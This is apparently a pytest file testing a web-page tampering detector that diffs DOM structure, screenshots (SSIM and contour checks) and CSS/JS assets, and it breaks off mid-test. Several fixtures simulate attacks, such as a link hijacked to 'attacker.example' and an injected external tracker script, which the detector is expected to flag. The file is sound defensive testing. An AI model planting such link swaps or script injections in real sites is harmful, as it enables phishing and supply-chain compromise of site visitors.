"""Comparator unit tests (Phase A.4).

Direct tests for the smaller-grained functions in `test_ui/comparator/`,
complementing the slow end-to-end golden in `test_comparator_golden.py`.

Marked `@pytest.mark.slow` because:
  - DOM tests import BeautifulSoup + lxml - fine, but bundled with the slow
    suite for one-stop run.
  - Screenshot tests use OpenCV (cv2) + skimage SSIM, which take 100-300ms
    per call and dominate cold-start cost. Pinned versions
    (opencv-python-headless==4.11.0.86, scikit-image==0.26.0) so byte-content
    of visual diffs stays stable; bumping either may shift outputs.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from PIL import Image

from test_ui.comparator import assets, dom, screenshots


pytestmark = pytest.mark.slow


# ---------------------------------------------------------------------------
# DOM diff - crafted HTML pairs
# ---------------------------------------------------------------------------


def _write_html(path: Path, html: str) -> Path:
    path.write_text(html, encoding="utf-8")
    return path


def test_compare_dom_returns_no_changes_for_identical_html(tmp_path):
    """Identical input → has_changes=False, content/length deltas zero."""
    html = "<html><head><title>T</title></head><body><p>same</p></body></html>"
    a = _write_html(tmp_path / "a.html", html)
    b = _write_html(tmp_path / "b.html", html)

    result = dom.compare_dom(a, b)

    assert "error" not in result
    assert result["has_changes"] is False
    assert result["title"]["changed"] is False
    assert result["content"]["length_change"] == 0
    assert result["structure"]["element_changes"] == []


def test_compare_dom_detects_href_hijack(tmp_path):
    """Phishing-class change: `<a href>` value swap with no count change.

    Pre-fix this slipped through entirely - the differ only counted
    elements per tag. Now `key_attributes.changes` carries the
    attribute_changed record with `impact: high` so the AI severity
    rollup escalates appropriately.
    """
    a = _write_html(
        tmp_path / "a.html",
        '<html><body><a href="https://gov.ie/">Home</a></body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html><body><a href="https://attacker.example/">Home</a></body></html>',
    )

    result = dom.compare_dom(a, b)

    assert result["has_changes"] is True
    attr_changes = result["key_attributes"]["changes"]
    assert len(attr_changes) == 1
    assert attr_changes[0]["type"] == "attribute_changed"
    assert attr_changes[0]["key"] == "a[0].href"
    assert attr_changes[0]["new_value"] == "https://attacker.example/"
    assert attr_changes[0]["impact"] == "high"


def test_compare_dom_detects_lang_attribute_flip(tmp_path):
    """Language flip - subtle attr change, no element count delta."""
    a = _write_html(
        tmp_path / "a.html",
        '<html lang="en"><body>x</body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html lang="fr"><body>x</body></html>',
    )

    result = dom.compare_dom(a, b)

    assert result["has_changes"] is True
    assert any(
        c["key"] == "html[0].lang" and c["new_value"] == "fr"
        for c in result["key_attributes"]["changes"]
    )


def test_compare_dom_detects_script_src_injection(tmp_path):
    """External tracker added: count change AND src on the new entry.

    The structural element-count check already catches the count
    change; this test pins that the new attribute walker also emits
    the `script[N].src=...` record for the new element with `impact:
    high` (supply-chain class).
    """
    a = _write_html(
        tmp_path / "a.html",
        '<html><head><script src="legit.js"></script></head><body>x</body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<script src="legit.js"></script>'
            '<script src="https://attacker.example/track.js"></script>'
            "</head><body>x</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)

    assert result["has_changes"] is True
    # New `script[1].src=https://attacker.example/track.js` shows up.
    attacker_attr = next(
        (
            c
            for c in result["key_attributes"]["changes"]
            if "attacker.example" in str(c)
        ),
        None,
    )
    assert attacker_attr is not None
    assert attacker_attr["impact"] == "high"


def test_compare_dom_detects_heading_text_prefix(tmp_path):
    """Prepending a 24-char marker to <h1> is BELOW the 50-char total
    text-length threshold, so pre-fix it slipped through. Now the
    per-heading walker catches it as `heading_text_changed`."""
    a = _write_html(
        tmp_path / "a.html",
        "<html><body><h1>Department of Foreign Affairs</h1></body></html>",
    )
    b = _write_html(
        tmp_path / "b.html",
        ("<html><body><h1>[CRITICAL] Department of Foreign Affairs</h1></body></html>"),
    )

    result = dom.compare_dom(a, b)

    assert result["has_changes"] is True
    heading_changes = result["headings"]["changes"]
    assert len(heading_changes) == 1
    assert heading_changes[0]["key"] == "h1[0]"
    assert heading_changes[0]["old_text"] == "Department of Foreign Affairs"
    assert heading_changes[0]["new_text"] == "[CRITICAL] Department of Foreign Affairs"


def test_compare_dom_no_changes_for_identical_with_attributes(tmp_path):
    """Identical pages with key attributes present must NOT flag - the
    new walker shouldn't add false positives on unchanged input."""
    html = (
        '<html lang="en">'
        '<body><a href="/x">l</a><script src="s.js"></script></body>'
        "</html>"
    )
    a = _write_html(tmp_path / "a.html", html)
    b = _write_html(tmp_path / "b.html", html)

    result = dom.compare_dom(a, b)
    assert result["has_changes"] is False
    assert result["key_attributes"]["changes"] == []
    assert result["headings"]["changes"] == []


def test_compare_dom_detects_title_change(tmp_path):
    a = _write_html(
        tmp_path / "a.html",
        "<html><head><title>Welcome</title></head><body><p>x</p></body></html>",
    )
    b = _write_html(
        tmp_path / "b.html",
        "<html><head><title>Welcome v2</title></head><body><p>x</p></body></html>",
    )

    result = dom.compare_dom(a, b)

    assert result["title"]["changed"] is True
    assert result["title"]["baseline"] == "Welcome"
    assert result["title"]["current"] == "Welcome v2"
    assert result["has_changes"] is True


def test_compare_dom_detects_added_element(tmp_path):
    a = _write_html(tmp_path / "a.html", "<html><body><div>one</div></body></html>")
    b = _write_html(
        tmp_path / "b.html", "<html><body><div>one</div><div>two</div></body></html>"
    )

    result = dom.compare_dom(a, b)

    div_changes = [
        c for c in result["structure"]["element_changes"] if c["element"] == "div"
    ]
    assert len(div_changes) == 1
    assert div_changes[0]["change_type"] == "added"
    assert div_changes[0]["count_change"] == 1


def test_compare_dom_detects_removed_high_impact_element(tmp_path):
    """High-impact tags (form/button/input) currently get impact='high' on
    BOTH addition and removal - the `change_type` parameter to
    `assess_element_impact` is unused (see latent-bug pin in
    test_assess_element_impact_high_impact_branch_is_unconditional below)."""
    a = _write_html(
        tmp_path / "a.html", "<html><body><button>Submit</button><p>x</p></body></html>"
    )
    b = _write_html(tmp_path / "b.html", "<html><body><p>x</p></body></html>")

    result = dom.compare_dom(a, b)
    btn = [
        c for c in result["structure"]["element_changes"] if c["element"] == "button"
    ]
    assert len(btn) == 1
    assert btn[0]["change_type"] == "removed"
    assert btn[0]["impact"] == "high"  # pinned: same as 'added' (see flag)


def test_compare_dom_significant_content_change_threshold(tmp_path):
    """`content.significant_change` is True iff abs(length_change) > 100.

    The threshold is currently 100 (see dom.compare_dom). Pinning it because
    the comparator-summary content-block bug fix (A.3) made this flag visible
    in the change_summary.json output for the first time.
    """
    a = _write_html(tmp_path / "a.html", "<html><body><p>short</p></body></html>")
    # Body text is 200 chars longer.
    long_text = "x" * 200
    b = _write_html(
        tmp_path / "b.html", f"<html><body><p>{long_text}</p></body></html>"
    )

    result = dom.compare_dom(a, b)
    assert result["content"]["significant_change"] is True
    assert result["content"]["length_change"] >= 100


def test_compare_dom_below_significance_threshold(tmp_path):
    """A small content delta must NOT trip significant_change."""
    a = _write_html(tmp_path / "a.html", "<html><body><p>aaa</p></body></html>")
    b = _write_html(tmp_path / "b.html", "<html><body><p>aaab</p></body></html>")

    result = dom.compare_dom(a, b)
    assert result["content"]["significant_change"] is False


def test_compare_dom_meta_changes_detected(tmp_path):
    a = _write_html(
        tmp_path / "a.html",
        '<html><head><meta name="description" content="Old"></head><body/></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html><head><meta name="description" content="New"></head><body/></html>',
    )

    result = dom.compare_dom(a, b)
    assert result["meta"]["changes"], "meta description change should appear"
    assert result["has_changes"] is True


def test_compare_dom_returns_error_for_missing_files(tmp_path):
    """Missing files → typed error dict, no exception."""
    result = dom.compare_dom(tmp_path / "nope_a.html", tmp_path / "nope_b.html")
    assert "error" in result
    assert result["error"] == "HTML files missing"


def test_compare_dom_handles_malformed_html_gracefully(tmp_path):
    """BeautifulSoup is forgiving; we should still return a sensible result, not crash."""
    a = _write_html(tmp_path / "a.html", "<html><body><p>")  # unclosed tags
    b = _write_html(tmp_path / "b.html", "<not-real><<<>>>")
    result = dom.compare_dom(a, b)
    # bs4 with lxml parses these without raising - assert we got a dict back,
    # not an error envelope.
    assert "error" not in result
    assert "has_changes" in result


# ---------------------------------------------------------------------------
# create_html_changes_json - projection of dom_result into AI-facing shape
# ---------------------------------------------------------------------------


def test_create_html_changes_json_passes_through_error(tmp_path):
    """Error envelope from compare_dom must produce a degraded but valid summary."""
    error_input = {"error": "DOM comparison failed: ..."}
    out = dom.create_html_changes_json(error_input)

    assert out["changes_detected"] is False
    assert out["changes"] == []
    assert out["summary"]["severity"] == "none"


def test_create_html_changes_json_emits_title_change_record(tmp_path):
    a = _write_html(
        tmp_path / "a.html", "<html><head><title>A</title></head><body/></html>"
    )
    b = _write_html(
        tmp_path / "b.html", "<html><head><title>B</title></head><body/></html>"
    )
    result = dom.compare_dom(a, b)
    out = dom.create_html_changes_json(result)

    title_changes = [c for c in out["changes"] if c["element"] == "title"]
    assert len(title_changes) == 1
    assert title_changes[0]["old_value"] == "A"
    assert title_changes[0]["new_value"] == "B"


# ---------------------------------------------------------------------------
# assess_element_impact - pure heuristic
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "tag,count_diff,expected",
    [
        # HIGH_IMPACT_TAGS - always 'high', no magnitude threshold.
        ("form", 1, "high"),
        ("button", 1, "high"),
        ("input", 5, "high"),
        # MEDIUM_IMPACT_TAGS: 'medium' if count_diff > 2 else 'low'.
        ("a", 3, "medium"),
        ("img", 1, "low"),
        ("h1", 2, "low"),
        # LOW_IMPACT_TAGS: 'low' if count_diff < 10 else 'medium'.
        ("div", 5, "low"),
        ("span", 50, "medium"),
        # Tag outside the three classes - always 'low'.
        ("blockquote", 100, "low"),
    ],
)
def test_assess_element_impact(tag, count_diff, expected):
    assert dom.assess_element_impact(tag, count_diff) == expected


def test_assess_element_impact_high_impact_is_unconditional():
    """HIGH_IMPACT_TAGS always rate 'high' - no magnitude threshold.

    Pre-cleanup the function had a `count_diff > 0 else 'medium'` ternary
    in the HIGH_IMPACT branch, but `count_diff` is always positive at the
    call sites (`abs(current - baseline)`, only invoked when those differ),
    so the 'medium' arm was dead code. Cleanup dropped it; this test pins
    the unconditional 'high' so a future maintainer reintroducing
    asymmetric scoring (e.g. medium-on-remove, high-on-add) makes the
    decision deliberately rather than slipping it back in.
    """
    assert dom.assess_element_impact("form", 1) == "high"
    assert dom.assess_element_impact("form", 99) == "high"
    assert dom.assess_element_impact("button", 1) == "high"


# ---------------------------------------------------------------------------
# Screenshots - synthetic Pillow images
# ---------------------------------------------------------------------------


def _make_solid_png(path: Path, size=(100, 100), color=(255, 0, 0)) -> Path:
    Image.new("RGB", size, color).save(path)
    return path


def test_compare_screenshots_identical_images_perfect_ssim(tmp_path):
    """Identical PNGs → SSIM == 1.0, no diff image written."""
    a = _make_solid_png(tmp_path / "a.png", color=(0, 255, 0))
    b = _make_solid_png(tmp_path / "b.png", color=(0, 255, 0))
    diffs_dir = tmp_path / "diffs"

    result = screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)

    assert result["ssim_score"] == pytest.approx(1.0, abs=1e-6)
    assert result["visual_changes"] is False
    # Identical means no diff image needed.
    assert not (diffs_dir / "visual_diff.png").exists()


def test_compare_screenshots_different_colors_low_ssim(tmp_path):
    """Solid red vs solid blue - drastically different. SSIM should be low,
    visual_diff.png written."""
    a = _make_solid_png(tmp_path / "a.png", color=(255, 0, 0))
    b = _make_solid_png(tmp_path / "b.png", color=(0, 0, 255))
    diffs_dir = tmp_path / "diffs"

    result = screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)

    assert result["ssim_score"] < 0.999, (
        "drastically different colors should not be near-identical"
    )
    assert result["visual_changes"] is True
    assert (diffs_dir / "visual_diff.png").exists()
    # Diff PNG should have non-trivial size (Otsu mask + contour drawing).
    assert (diffs_dir / "visual_diff.png").stat().st_size > 100


def test_compare_screenshots_dimension_change_flagged(tmp_path):
    """Different image dimensions must set dimensions_changed=True.

    The function still resizes to the larger dimension to produce an SSIM,
    but the dimension-change flag tells the report renderer to display a
    layout-shift warning.
    """
    a = _make_solid_png(tmp_path / "a.png", size=(100, 100), color=(255, 0, 0))
    b = _make_solid_png(tmp_path / "b.png", size=(150, 100), color=(255, 0, 0))
    diffs_dir = tmp_path / "diffs"

    result = screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)

    assert result["dimensions_changed"] is True


def test_compare_screenshots_returns_error_for_missing_files(tmp_path):
    """Missing screenshots → error dict with ssim_score=0.0 (caller's contract)."""
    result = screenshots.compare_screenshots(
        tmp_path / "nope_a.png",
        tmp_path / "nope_b.png",
        "https://test/",
        tmp_path / "diffs",
    )
    assert "error" in result
    assert result["ssim_score"] == 0.0


def _make_webp_roundtrip_pair(tmp_path: Path) -> tuple[Path, Path]:
    """Build two PNGs that differ ONLY by WebP encoding noise (~SSIM 0.999).

    Solid-color images encode losslessly through WebP - SSIM stays at 1.0
    and doesn't exercise the threshold. Use a deterministic random-noise
    image instead: WebP @ 90% on real noise introduces real per-pixel
    drift that mirrors what the live crawler produces against gov.ie.
    """
    import io

    import numpy as np
    from PIL import Image as _Image

    rng = np.random.default_rng(seed=42)
    arr = rng.integers(0, 256, size=(200, 200, 3), dtype=np.uint8)
    img = _Image.fromarray(arr, mode="RGB")
    img.save(tmp_path / "a.png")
    buf = io.BytesIO()
    img.save(buf, format="WEBP", quality=90, method=6)
    buf.seek(0)
    _Image.open(buf).convert("RGB").save(tmp_path / "b.png")
    return tmp_path / "a.png", tmp_path / "b.png"


def test_compare_screenshots_near_identical_below_noise_floor(tmp_path):
    """Two PNGs that differ only by WebP encoding noise (SSIM ~0.999)
    should NOT count as a visual change at the default threshold (0.95).
    Pre-fix the comparator used `score < 1.0`, flagging every encoding
    artifact - dashboard's site 16 false positive."""
    a, b = _make_webp_roundtrip_pair(tmp_path)
    diffs_dir = tmp_path / "diffs"

    result = screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)

    # Sanity check: SSIM is genuinely sub-1.0 (otherwise the test inputs
    # don't exercise the threshold).
    assert result["ssim_score"] < 1.0
    # Encoding noise should be far above the 0.95 default threshold.
    assert result["ssim_score"] > 0.95
    assert result["visual_changes"] is False, (
        f"SSIM={result['ssim_score']:.6f} is encoding noise, not a real "
        "visual change; comparator should ignore."
    )
    assert not (diffs_dir / "visual_diff.png").exists()


def test_compare_screenshots_threshold_override_via_settings(tmp_path, monkeypatch):
    """Settings-backed threshold: tighten it past the noise floor and the
    same near-identical pair starts flagging. Confirms the threshold is
    actually consulted (catches the regression where it was silently
    hardcoded `< 1.0`)."""
    from test_ui.config import settings

    a, b = _make_webp_roundtrip_pair(tmp_path)
    diffs_dir = tmp_path / "diffs"

    # 0.9999 is BELOW the WebP-noise SSIM (~0.999) so the threshold trips.
    monkeypatch.setattr(settings, "visual_similarity_threshold", 0.9999)

    result = screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)
    assert result["visual_changes"] is True, (
        "With threshold=0.9999, encoding noise (SSIM ~0.999) must flag - "
        "proves the threshold is wired through, not previously-hardcoded "
        "`< 1.0`."
    )


def test_compare_screenshots_localized_rect_caught_by_contour_gate(tmp_path):
    """An 80x80 painted rectangle on a 1080x600 image has SSIM mean
    ~0.99 (above the 0.95 default threshold) but produces a clearly
    detectable contour. The contour-area gate must catch it.

    Pre-fix this was a false negative: SSIM threshold alone said "no
    change" because the changed area was small relative to the image.
    """
    import numpy as np
    from PIL import Image as _Image, ImageDraw as _ImageDraw

    # Synthesize a deterministic noisy "page" - WebP-style noise + a
    # white background panel - so SSIM stays above 0.95 outside the rect.
    rng = np.random.default_rng(seed=7)
    bg = rng.integers(220, 256, size=(600, 1080, 3), dtype=np.uint8)
    img = _Image.fromarray(bg, mode="RGB")
    img.save(tmp_path / "a.png")

    # Paint an 80x80 red rect at (10, 10) on a copy.
    img2 = _Image.open(tmp_path / "a.png").convert("RGB")
    _ImageDraw.Draw(img2).rectangle((10, 10, 90, 90), fill=(255, 0, 0))
    img2.save(tmp_path / "b.png")

    diffs_dir = tmp_path / "diffs"
    result = screenshots.compare_screenshots(
        tmp_path / "a.png", tmp_path / "b.png", "https://test/", diffs_dir
    )

    # SSIM is above the threshold (mean across the whole image is high
    # even though the local 80x80 region is very different). The
    # contour gate is what saves us.
    assert result["ssim_score"] > 0.95, (
        f"Sanity: SSIM={result['ssim_score']:.4f} should be above the "
        "0.95 threshold for this small-area localized change - if it's "
        "below, this test no longer exercises the contour gate."
    )
    assert result["max_contour_area"] >= 50
    assert result["visual_changes"] is True
    assert (diffs_dir / "visual_diff.png").exists()


def test_compare_screenshots_subpixel_change_below_contour_floor(tmp_path):
    """A 2x2 painted square is below the 50 px² floor even after SSIM-
    window spreading. Combined with above-threshold SSIM, no flag.

    This documents the floor: the framework treats sub-7x7-ish
    changes as noise. Operators can tighten by lowering
    `AFR_VISUAL_MIN_CONTOUR_AREA` if they're auditing a static-asset
    corpus where every pixel matters.
    """
    import numpy as np
    from PIL import Image as _Image, ImageDraw as _ImageDraw

    rng = np.random.default_rng(seed=11)
    bg = rng.integers(220, 256, size=(600, 1080, 3), dtype=np.uint8)
    img = _Image.fromarray(bg, mode="RGB")
    img.save(tmp_path / "a.png")
    img2 = _Image.open(tmp_path / "a.png").convert("RGB")
    _ImageDraw.Draw(img2).rectangle((0, 0, 2, 2), fill=(0, 0, 0))
    img2.save(tmp_path / "b.png")

    diffs_dir = tmp_path / "diffs"
    result = screenshots.compare_screenshots(
        tmp_path / "a.png", tmp_path / "b.png", "https://test/", diffs_dir
    )
    # Exact contour area depends on cv2 internals; assert the gate
    # behavior, not the precise count.
    assert result["max_contour_area"] < 50
    assert result["visual_changes"] is False


def test_compare_screenshots_contour_floor_override_via_settings(tmp_path, monkeypatch):
    """Settings-backed contour floor: drop it to 1 px and the same 2x2
    change starts flagging. Proves the gate is wired through and not
    silently hardcoded."""
    import numpy as np
    from PIL import Image as _Image, ImageDraw as _ImageDraw

    from test_ui.config import settings

    rng = np.random.default_rng(seed=11)
    bg = rng.integers(220, 256, size=(600, 1080, 3), dtype=np.uint8)
    img = _Image.fromarray(bg, mode="RGB")
    img.save(tmp_path / "a.png")
    img2 = _Image.open(tmp_path / "a.png").convert("RGB")
    _ImageDraw.Draw(img2).rectangle((0, 0, 2, 2), fill=(0, 0, 0))
    img2.save(tmp_path / "b.png")

    monkeypatch.setattr(settings, "visual_min_contour_area", 1)

    result = screenshots.compare_screenshots(
        tmp_path / "a.png",
        tmp_path / "b.png",
        "https://test/",
        tmp_path / "diffs",
    )
    assert result["visual_changes"] is True


def test_compare_screenshots_does_not_create_diffs_dir_when_identical(tmp_path):
    """Identical images must NOT create a diffs/ directory.

    Pre-A.3 generator did `diffs_dir.mkdir(exist_ok=True)` unconditionally;
    we want empty diffs/ dirs to never appear so the report layer can use
    "diffs/ exists" as a meaningful signal.
    """
    a = _make_solid_png(tmp_path / "a.png", color=(0, 255, 0))
    b = _make_solid_png(tmp_path / "b.png", color=(0, 255, 0))
    diffs_dir = tmp_path / "diffs"

    screenshots.compare_screenshots(a, b, "https://test/", diffs_dir)

    assert not diffs_dir.exists(), "diffs/ should not be created for identical inputs"


def test_compare_screenshots_writes_diff_image_for_subtle_change(tmp_path):
    """Slight color shift in a region - SSIM < 1.0, diff image written.

    Uses Pillow to paint a red square onto a green canvas in the 'current'
    image only. The diff image should highlight the changed region.
    """
    a_img = Image.new("RGB", (100, 100), (0, 255, 0))
    a_img.save(tmp_path / "a.png")

    b_img = Image.new("RGB", (100, 100), (0, 255, 0))
    # Paint a red square in the top-left 30x30 region.
    for x in range(30):
        for y in range(30):
            b_img.putpixel((x, y), (255, 0, 0))
    b_img.save(tmp_path / "b.png")

    diffs_dir = tmp_path / "diffs"
    result = screenshots.compare_screenshots(
        tmp_path / "a.png",
        tmp_path / "b.png",
        "https://test/",
        diffs_dir,
    )

    assert result["visual_changes"] is True
    assert 0.0 < result["ssim_score"] < 1.0
    assert (diffs_dir / "visual_diff.png").exists()


# ---------------------------------------------------------------------------
# Asset comparator - URL normalization (Bug #1 from report 01KQX43...)
# ---------------------------------------------------------------------------


def test_normalize_volatile_urls_strips_path_version():
    """Google-style /vN/ path version bumps (the canonical CDN noise)
    must collapse to /vN/ so equality holds across version bumps."""
    a = "url(https://fonts.gstatic.com/s/foo/v332/abc.ttf)"
    b = "url(https://fonts.gstatic.com/s/foo/v333/abc.ttf)"
    assert assets.normalize_volatile_urls(a) == assets.normalize_volatile_urls(b)


def test_normalize_volatile_urls_strips_query_version():
    """`?v=v123`, `&v=v123`, `?ver=4` all collapse to a placeholder."""
    a = "url(https://x/font?kit=k&v=v332)"
    b = "url(https://x/font?kit=k&v=v333)"
    assert assets.normalize_volatile_urls(a) == assets.normalize_volatile_urls(b)
    a2 = "url(https://x/y?ver=4)"
    b2 = "url(https://x/y?ver=12)"
    assert assets.normalize_volatile_urls(a2) == assets.normalize_volatile_urls(b2)


def test_normalize_volatile_urls_strips_cache_busters():
    for old, new in [
        ("?_=1234", "?_=5678"),
        ("&t=999", "&t=111"),
        ("?cb=42", "?cb=99"),
    ]:
        assert assets.normalize_volatile_urls(
            f"url(http://x/y{old})"
        ) == assets.normalize_volatile_urls(f"url(http://x/y{new})")


def test_normalize_volatile_urls_idempotent():
    """Running normalization twice is a no-op (placeholders don't re-match)."""
    text = "url(https://x/y/v3/foo?v=v9)"
    once = assets.normalize_volatile_urls(text)
    twice = assets.normalize_volatile_urls(once)
    assert once == twice


def test_normalize_volatile_urls_preserves_genuine_changes():
    """Stable parts of the URL must NOT be normalized - we want a real
    domain swap or path mutation to STILL show as a change."""
    a = "url(https://fonts.gstatic.com/s/foo/v332/abc.ttf)"
    b = "url(https://attacker.example/s/foo/v332/abc.ttf)"
    # Different domain → still different after normalization.
    assert assets.normalize_volatile_urls(a) != assets.normalize_volatile_urls(b)


def test_analyze_css_content_changes_ignores_cdn_version_bump(tmp_path):
    """End-to-end: a CSS file that ONLY changed by Google Fonts v332→v333
    must come back as has_changes=False. This was the root cause of the
    framework-wide false-positive contamination (audit 01KQX43...)."""
    baseline_css = (
        "@font-face {\n"
        "  font-family: 'Material';\n"
        "  src: url(https://fonts.gstatic.com/s/material/v332/abc.ttf) format('truetype');\n"
        "}\n"
    )
    current_css = (
        "@font-face {\n"
        "  font-family: 'Material';\n"
        "  src: url(https://fonts.gstatic.com/s/material/v333/abc.ttf) format('truetype');\n"
        "}\n"
    )
    a = tmp_path / "a.css"
    b = tmp_path / "b.css"
    a.write_text(baseline_css)
    b.write_text(current_css)
    result = assets.analyze_css_content_changes(a, b, "fonts.css")
    assert result["has_changes"] is False, (
        f"CDN-version-only change must NOT flag; got changes: {result.get('changes')}"
    )


def test_analyze_css_content_changes_still_catches_real_change(tmp_path):
    """The normalization must NOT mask actual rule changes."""
    a = tmp_path / "a.css"
    b = tmp_path / "b.css"
    a.write_text(".btn { color: #000; }\n")
    b.write_text(".btn { color: #f00; }\n")
    result = assets.analyze_css_content_changes(a, b, "real.css")
    assert result["has_changes"] is True


def test_parse_css_rules_indexed_preserves_duplicate_selectors():
    """When a selector appears twice (common on real sites), the indexed
    parser must keep BOTH occurrences. The legacy dict-based parser
    silently overwrote the first with the second, causing the framework
    to miss mutations that lived in an early occurrence.
    Regression: site 14 of audit 01KRB5GSSM3J76H9Y2MPTZWPS4."""
    css = (
        "hr.green { border: solid #a2c241 1px !important; }\n"
        "@font-face { font-family: 'x'; }\n"
        "hr.green { visibility: visible; }\n"
    )
    indexed = assets.parse_css_rules_indexed(css)
    assert "hr.green" in indexed
    assert len(indexed["hr.green"]) == 2
    assert indexed["hr.green"][0]["border"] == "solid #a2c241 1px !important"
    assert indexed["hr.green"][1]["visibility"] == "visible"


def test_analyze_css_content_changes_catches_duplicate_selector_mutation(
    tmp_path,
):
    """If the first of two body rules changes color while the second stays
    the same, the diff must still flag it."""
    a = tmp_path / "a.css"
    b = tmp_path / "b.css"
    a.write_text(
        "body { color: #ff0066; }\n"
        "body { min-width: 300px; }\n"
    )
    b.write_text(
        "body { color: #404040; }\n"
        "body { min-width: 300px; }\n"
    )
    result = assets.analyze_css_content_changes(a, b, "screen.css")
    assert result["has_changes"] is True
    mods = [c for c in result["changes"] if c["type"] == "css_selector_modified"]
    assert any(
        c["selector"] == "body" and c["occurrence"] == 1 for c in mods
    ), f"Expected body occurrence 1 modified; got {mods}"


def test_analyze_js_content_changes_ignores_cdn_version_bump(tmp_path):
    """JS files referencing CDN-versioned URLs in string literals get the
    same treatment - common for analytics loaders / font loaders."""
    a = tmp_path / "a.js"
    b = tmp_path / "b.js"
    a.write_text('var url = "https://x/v332/track.js";\n')
    b.write_text('var url = "https://x/v333/track.js";\n')
    result = assets.analyze_js_content_changes(a, b, "loader.js")
    assert result["has_changes"] is False


def test_analyze_new_file_media_binary_is_handled_without_utf8_decode(tmp_path):
    """Binary media files are analyzed as bytes (size metadata), not text.

    Regression guard: pre-fix `analyze_new_file(..., asset_type='media')`
    called read_text(utf-8) and returned a decode error for ordinary
    binary assets.
    """
    media = tmp_path / "logo.bin"
    payload = b"\x89PNG\r\n\x1a\n\x00\x00\x00"
    media.write_bytes(payload)

    result = assets.analyze_new_file(media, "media", "added")

    assert "error" not in result
    assert result["change_type"] == "added"
    assert result["file_size"] == len(payload)


def test_normalize_volatile_urls_strips_trackerid():
    """Matomo HeatmapSessionRecording rotates a per-pageview `trackerid`
    in the configs.php query string. Two URLs that differ ONLY in the
    trackerid value must collapse to the same normalized form.

    Regression: report 01KR1QKTTJQZJ1FJYECQ1M2W6Q audit - this token
    rotation flagged `script[3].src` on every site (including the
    untouched control), surfacing as the lone false positive."""
    a = (
        "https://stats.ciboard.ie/plugins/HeatmapSessionRecording/"
        "configs.php?idsite=4&trackerid=ZxLbcO&url=https%3A%2F%2Fx%2F"
    )
    b = (
        "https://stats.ciboard.ie/plugins/HeatmapSessionRecording/"
        "configs.php?idsite=4&trackerid=pKrxdu&url=https%3A%2F%2Fx%2F"
    )
    assert assets.normalize_volatile_urls(a) == assets.normalize_volatile_urls(b)
    # And the URL otherwise (path, idsite, url) is preserved - a real
    # path swap on the same trackerid still differs after normalization.
    c = (
        "https://attacker.example/plugins/HeatmapSessionRecording/"
        "configs.php?idsite=4&trackerid=ZxLbcO&url=https%3A%2F%2Fx%2F"
    )
    assert assets.normalize_volatile_urls(a) != assets.normalize_volatile_urls(c)


def test_compare_dom_ignores_trackerid_rotation_in_script_src(tmp_path):
    """End-to-end DOM diff: a page whose only change is a Matomo
    trackerid rotation on a `<script src>` must come back has_changes=
    False. Without this the false positive lands on every site captured
    in 01KR1QKTTJQZJ1FJYECQ1M2W6Q (control included).
    """
    baseline = (
        "<html><body>"
        "<script src='https://stats.ciboard.ie/plugins/"
        "HeatmapSessionRecording/configs.php?idsite=4&amp;trackerid=ZxLbcO'>"
        "</script>"
        "</body></html>"
    )
    current = baseline.replace("trackerid=ZxLbcO", "trackerid=pKrxdu")
    bp = tmp_path / "b.html"
    cp = tmp_path / "c.html"
    bp.write_text(baseline)
    cp.write_text(current)
    result = dom.compare_dom(bp, cp)
    assert result["has_changes"] is False, (
        "trackerid-only rotation must NOT flag - it's per-pageview noise. "
        f"Got changes: key_attrs={result.get('key_attributes')}"
    )


def test_compare_dom_still_detects_real_script_src_swap(tmp_path):
    """Counter-test: a real attacker-domain swap on the same trackerid
    must STILL flag - normalization can't be a blanket suppressor."""
    baseline = (
        "<html><body>"
        "<script src='https://stats.ciboard.ie/x.js?trackerid=ZxLbcO'></script>"
        "</body></html>"
    )
    current = baseline.replace("stats.ciboard.ie", "attacker.example")
    bp = tmp_path / "b.html"
    cp = tmp_path / "c.html"
    bp.write_text(baseline)
    cp.write_text(current)
    result = dom.compare_dom(bp, cp)
    assert result["has_changes"] is True
    changes = result["key_attributes"]["changes"]
    assert any("script" in c["key"] and "src" in c["key"] for c in changes), (
        f"real domain swap must surface as a script.src change; got {changes}"
    )


# ---------------------------------------------------------------------------
# DOM differ - wildcard attribute tracking on html/body (Bug #2)
# ---------------------------------------------------------------------------


def test_compare_dom_detects_body_class_change(tmp_path):
    """`<body class>` mutations were invisible pre-fix because `class`
    wasn't in KEY_ATTRIBUTES. Now wildcard tracking on body catches it.
    Class is meaningful: it drives which CSS rules apply (theme switches,
    layout grid mode, etc.)."""
    a = _write_html(
        tmp_path / "a.html",
        '<html><body class="theme-light layout-grid">x</body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html><body class="theme-dark layout-grid afr-tamper-class">x</body></html>',
    )

    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    body_class = next(
        (c for c in result["key_attributes"]["changes"] if c["key"] == "body[0].class"),
        None,
    )
    assert body_class is not None
    assert body_class["type"] == "attribute_changed"
    assert body_class["impact"] == "medium"


def test_compare_dom_detects_body_data_attr_injection(tmp_path):
    """Phishing/analytics injection that adds `data-*` to <body>. Real-
    world: `<body data-experiment="phishing-variant">` for cloaked
    payloads. Pre-fix invisible (data-* not enumerable in KEY_ATTRIBUTES);
    now caught by the wildcard walker."""
    a = _write_html(tmp_path / "a.html", "<html><body>x</body></html>")
    b = _write_html(
        tmp_path / "b.html",
        '<html><body data-afr-tamper="1">x</body></html>',
    )

    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    injected = next(
        (
            c
            for c in result["key_attributes"]["changes"]
            if c["key"] == "body[0].data-afr-tamper"
        ),
        None,
    )
    assert injected is not None
    assert injected["type"] == "attribute_added"


def test_compare_dom_html_lang_priority_over_wildcard(tmp_path):
    """`html.lang` is in KEY_ATTRIBUTES (medium impact); the wildcard
    walker should NOT double-emit. One change in, one record out."""
    a = _write_html(tmp_path / "a.html", '<html lang="en"><body>x</body></html>')
